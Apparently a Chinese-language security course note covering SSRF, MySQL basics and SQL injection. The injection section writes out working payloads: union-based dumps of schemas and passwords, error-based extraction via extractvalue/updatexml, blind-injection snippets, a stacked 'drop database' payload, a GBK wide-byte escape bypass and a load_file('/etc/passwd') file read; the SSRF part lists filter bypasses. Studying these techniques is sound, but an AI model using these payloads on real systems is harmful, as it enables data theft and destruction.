# 第 9 天（下）：SSRF，SQL 注入

## 服务器端请求伪造 SSRF

SSRF（Server-Side Request Forgery）：由服务端发起请求的一个安全漏洞。

因为是由服务端发起的，所以它能请求到与它相连而与外网隔离的内部系统。

```plain
我们的机器 -X-> 机器 B
但是 我们的机器 --> 机器 A --> 机器 B
```

### SSRF 的实际场景

- 某个网页可以保存指定 url 上的一张图片到本地。
- 某个网页可以 get 一个 url 并且渲染。
- 某个网页可以把 url 转成 html。
- 在线翻译（提供 url）。
- 让其它的 app 帮你渲染网站。

### 产生 SSRF 的代码

就是可以访问网站的代码。

PHP：curl，file_get_contents，fsockopen 等。

```php
<?php
	file_get_contents('http://114.5.1.4');
	$fp = fsockopen('114.5.1.4', 80);
	fwrite($fp,'810');
```

Python：urllib.request。

```python
import urllib.request
resp = urllib.request.urlopen('http://114.5.1.4/810')
```

### SSRF 的打击面

- 内网 redis 数据库：
	- redis 认证不需要用户名，如果使用了弱密码即会被攻击！
	- redis 拥有把数据保存到某个位置的功能。
- 内网 memcache 数据库：
	- 可以写 key，value，以及查看一些系统信息。
- 内网 WEB 服务探测。
- 打通内外网边界。
- 被当作代理。

### 让 SSRF 穿保护

- 对方会检查输入字符串是否包含指定字符串，比如说 IP。
	- 此时别忘了 IP 还有 8、10、16 进制表示法，还可能省略中间连着的 0。
- 使用会解析到特定 IP 地址的域名。
- URL 重定向。
- DNS 重绑定。
- 让一个域名第一次返回安全的 IP，第二次返回危险的。

### 不让 SSRF 穿保护

- 好好写过滤。比如要过滤掉协议限制、黑名单，以及各种关键字。
- 域名解析：限制 IP。
- 禁止重定向，或者限制重定向的次数并且每次重定向后都做判断。
- 在主机层面：使用各种规则，禁止访问其它机器。

## 数据库

可以说是一种复杂一些的表格。

### 数据库的类型

- 关系型
- 非关系型
- 键值（Key-value）

关系型：基于关系模型，存储相互关联的数据点。

- MySQL
- Oracle
- SqlServer

非关系型：

- 文档数据库：mongodb。
- 列式数据库：clickhouse。
- 图形数据库（顶点和边）：neo4j。

键值数据库：

- redis
- memcached

## MySQL：使用广泛的数据库

### MySQL 数据类型

有符号整数：

- TINYINT（1 字节）
- SMALLINT（2 字节）
- MEDIUMINT（3 字节）（草，还有这种事情的吗？）
- INT（INTEGER）（4 字节）
- BIGINT（8 字节）

浮点数：

- FLOAT（4 字节）
- DOUBLE（8 字节）

小数 DEMICAL：由整数 M 和 D 组成，表示 M.D。

字符串：

- CHAR：定长字符串，0 ~ 255 字节。
- VARCHAR：变长字符串，0 ~ 255 字节。
- TINYBLOB：二进制字符串，0 ~ 255 字节。
- TINYTEXT：文本字符串，0 ~ 255 字节。
- BLOB：二进制字符串，0 ~ 65535 字节。
- TEXT：文本字符串，0 ~ 65535 字节。
- MEDIUMBLOB：二进制字符串，0 ~ 16777215 字节。
- MEDIUMTEXT：文本字符串，0 ~ 16777215 字节。
- LONGBLOB：二进制字符串，0 ~ 4294967295 字节。
- LONGTEXT：文本字符串，0 ~ 4294967295 字节。

### MySQL 语法

显示有哪些数据库：

```sql
mysql> show databases;
```

使用其中一个数据库：

```sql
mysql> use database_name;
```

列出当前数据库的所有的表：

```sql
mysql> show tables;
```

#### 创建表

```sql
mysql> CREATE TABLE person(
    -> id int,
    -> name varchar(255),
    -> city varchar(255)
    -> );
Query OK, 0 rows affected (0.03 sec)
mysql> show tables;
+---------------------+
| Tables_in_statistic |
+---------------------+
| person              |
| user                |
+---------------------+
6 rows in set (0.00 sec)
```

#### 删除表

```sql
drop table person; // 删除表
delete from person;
delete from person where id=1;
truncate table person; // 清空内容
```

#### 查找表

select from：

```sql
mysql> select * from person;
+------+-------+---------+
| id   | name  | city    |
+------+-------+---------+
| 1    | admin | beijing |
+------+-------+---------+
| 2    | test  | nanjing |
+------+-------+---------+
mysql> select * from person limit 1,1;
+------+-------+---------+
| id   | name  | city    |
+------+-------+---------+
| 2    | test  | nanjing |
+------+-------+---------+
```

select from where：

```sql
select field1, field2, ...fieldN from table_name1, table_name2..., ...table_nameN where condition1 [and [or]] condition2...
```

```sql
mysql> select * from person where name = 'test';
+------+-------+---------+
| id   | name  | city    |
+------+-------+---------+
| 2    | test  | nanjing |
+------+-------+---------+
```

#### 在表中增加数据

一行：

```sql
# 不指定字段 需要给每个字段赋值
insert into `Pokepal` values(1, 'Kate', 'Eevee', 'Female', 96);
# 指定字段
insert into `Pokepal` (id, name, race, gender) values (2, 'Kali', 'Cyndaquil', 'Male');
```

多行：

```sql
insert into [表名]([列名], [列名], ...)
values
([列值], [列值], ...),
([列值], [列值], ...),
([列值], [列值], ...);
```

#### 修改表中的数据

```sql
mysql> update person set id = 666 where name = 'test';
Query OK, 1 row affected (0.03 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> select * from person;
+------+-------+---------+
| id   | name  | city    |
+------+-------+---------+
| 1    | admin | beijing |
| 666  | test  | nanjing |
+------+-------+---------+
2 rows in set (0.00 sec)
```

#### 修改表的结构

```sql
# 修改 test_table 的 aaa 到 bbb：
alter table `test_table` rename column aaa to bbb;
# 修改表名：
alter table `test_table` rename to `test_table_renamed`;
# 修改字段默认值：
alter table `test_table` alter user set default 'test';
# 修改类型：
alter table `test_table` modify aaa_age int;
alter table `test_table` change aaa_age aaa_age_renamed bigint;
```

#### 联合查询

这个方法可以用来判断列数。

```sql
mysql> select * from person union select 1;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
mysql> select * from person union select 1,2;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
mysql> select * from person union select 1,2,3;
+------+-------+---------+
| id   | name  | city    |
+------+-------+---------+
| 1    | admin | beijing |
| 2    | test  | nanjing |
| 1    | 2     | 3       |
+------+-------+---------+
```

#### 排序

这个方法也可以用来判断列数。

```sql
mysql> select * from person order by name;
+------+-------+---------+
| id   | name  | city    |
+------+-------+---------+
| 1    | admin | beijing |
| 2    | test  | nanjing |
+------+-------+---------+
mysql> select * from person order by 4; // 按第四列排序
ERROR 1054 (42S22): Unknown column '4' in 'order clause'
```

#### 系统表，系统函数

查看当前数据库 `database()`：

```sql
mysql> select database();
+--------------------+
| database()         |
+--------------------+
| information_schema |
+--------------------+
1 row in set (0.00 sec)
```

查看当前用户 `user()`：

```sql
mysql> select user();
+-------------------+
| user()            |
+-------------------+
| aaaer@localhost   |
+-------------------+
1 row in set (0.00 sec)
```

查看数据库版本 `version()`：

```sql
mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.7.30-0ubuntu0.18.04.1 |
+-------------------------+
1 row in set (0.00 sec)
```

使用 `group_concat` 将多行结果合并成一个字符串：

```sql
mysql> select group_concat(name) from statistic.person;
+----------------------+
| group_concat(name)   |
+----------------------+
| admin,test           |
+----------------------+
mysql> select group_concat(name, id) from statistic.person;
+----------------------+
| group_concat(name)   |
+----------------------+
| admin1,test2         |
+----------------------+
```

#### information_schema

查看所有的数据库：

```sql
mysql> select * from information_schema.schemata;
+--------------+--------------------+----------------------------+------------------------+----------+
| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |
+--------------+--------------------+----------------------------+------------------------+----------+
| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |
| def          | statistic          | latin1                     | latin1_swedish_ci      | NULL     |
+--------------+--------------------+----------------------------+------------------------+----------+
2 rows in set (0.00 sec)
```

查看所有数据库中的所有表：

```sql
mysql> select TABLE_NAME from information_schema.tables;
```

查看某个数据库里的所有表：

```sql
mysql> select TABLE_NAME from information_schema.tables where table_schema='statistic';
```

查看表里的列：

```sql
mysql> select column_NAME from information_schema.columns where table_name='person';
+-------------+
| column_NAME |
+-------------+
| id          |
| name        |
| city        |
+-------------+
3 rows in set (0.00 sec)
```

## SQL 注入

SQL 注入攻击是通过将恶意的 SQL 查询或添加语句插入到应用的输入参数中，再在后台 SQL 服务器上解析执行进行的攻击。

比如数字型注入：

```sql
// http://xxx/index.php?id=1
select * from ? where id=1
```

还有字符型注入：

```sql
// http://xxx/index.php?name=admin
select * from ? where name='admin'
```

以及搜索型注入：

```sql
select * from ? where ? like '%关键字%'
```

### SQL 的注释

- `/*content*/`
- `-- content`（注意 `--` 后有个空格）
- `#content`

### SQL 注入的核心

- 引号逃逸
- 语法正确
	- 构造语句闭合：`select * from user where name='1 or '1'='1'`。
	- 使用注释来无视后面的内容。

### SQL 注入的攻击方式

- Bool 盲注攻击：即二分答案。
- 时间盲注攻击：使用 sleep 函数，比如符合某个条件的话就让页面 sleep 几秒。不是很常用。
- 基于报错的注入攻击：把内容夹杂在报错信息中。
- 联合查询注入：用 union 联合查询来直接拿到数据。
- 堆叠注入：一起执行多条语句。

#### Bool 盲注攻击

```sql
or length(str) < len;
or substr(str, loc, 1) = chr(l-r);
or ascii(c) = chr(l-r);
```

#### 时间盲注攻击

```sql
... and sleep(1);
if(..., sleep(1), sleep(3));
... and benchmark(100000000, 1);
```

#### 基于报错的注入攻击

`extractvalue(xml_document, Xpath_string)`：

使用 Xpath 格式的字符串从 xml 文档中获得内容。Xpath 格式错误就会报
错。

下面是正常用法：

```sql
mysql> select extractvalue('<a><b>222222</b></a>', '/a/b');
+----------------------------------------------+
| ExtractValue('<a><b>222222</b></a>', '/a/b') |
+----------------------------------------------+
| 222222                                       |
+----------------------------------------------+
1 row in set (0.00 sec)
mysql> select extractvalue('<a href="sss"></a><a href="2333"></a>','/a/attribute::href');
+----------------------------------------------------------------------------+
| extractValue('<a href="sss"></a><a href="2333"></a>','/a/attribute::href') |
+----------------------------------------------------------------------------+
| sss 2333                                                                   |
+----------------------------------------------------------------------------+
1 row in set (0.00 sec)
```

那么怎么用它来攻击呢？

```sql
select extractvalue(1, concat(0x7e, (select user()), 0x7e));
```

`select user()` 的输出被直接输出到了错误流里面。

`updatexml(xml_document, Xpath_string, new_value)`：

改变文档中符合条件的节点的值。

```sql
mysql> SELECT updatexml('<a><b>222222</b></a>', '/a/b','2333');
+--------------------------------------------------+
| updatexml('<a><b>222222</b></a>', '/a/b','2333') |
+--------------------------------------------------+
| <a>2333</a>                                      |
+--------------------------------------------------+
1 row in set (0.00 sec)
```

和上面的使用方式差不多。

`select updatexml(1, concat(0x7e, (select user()), 0x7e), 1);`

#### 联合查询注入

如果页面上可以显示 SQL 语句查询的结果的话……

```sql
mysql> select * from user where id=1 union select 111;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
mysql> select * from user where id=1 union select 111,222;
+------+----------+
| id   | username |
+------+----------+
| 1    | aaa      |
| 111  | 222      |
+------+----------+
2 rows in set (0.00 sec)
```

#### 堆叠注入

如果服务端支持多条 SQL 指令：

```sql
1'; drop database;#
```

#### 宽字节注入

如果数据库编码为 GBK，就可以防止网站的转义让我们的引号被拦住。

```php
php > $s = "1%df'";
php > var_dump(addslashes($s));
string(6) "1%df\'"
```

```plain
id = 1%df' ->
id = 1%df\' ->
id = 1%df%5c%27 ->
id = 1運'
```

对面转义了我们的引号，然而加入的反斜杠 `%5c` 和前面的 `%df` 变成了一个汉字，对单引号的转义就失效了！

### 手工注入

看当前数据库：

```sql
' or (1) union select database()#
```

看数据库里的表：

```sql
' or (1) union select 1, 2, group_concat(table_name) from
information_schema.tables where TABLE_SCHEMA = 'webdb'#
```

看表里的列：

```sql
' or (1) union select group_concat(column_name) from
information_schema.columns where TABLE_NAME = 'USERS'#
```

看数据：

```sql
' or (1) union select password from webdb.USERS#
```

看文件内容：

```sql
1' or (1) union select load_file('/etc/passwd')#
```